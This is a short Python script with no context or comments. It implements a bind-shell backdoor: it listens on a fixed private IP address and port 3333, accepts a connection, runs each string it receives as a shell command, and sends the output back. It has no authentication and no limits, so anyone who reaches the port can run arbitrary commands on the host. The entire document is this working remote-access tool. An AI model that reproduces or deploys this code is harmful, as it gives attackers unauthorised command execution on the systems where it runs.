import socket
import subprocess as sp

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

s.bind(("192.168.43.92", 3333))
s.listen()

csession, caddr = s.accept()

while True:
      data = csession.recv(50)
      cmd = data.decode()
      print(cmd)
      output = sp.getoutput(cmd)
      csession.send(output.encode())
      cmd=0

csession.close()
s.close()
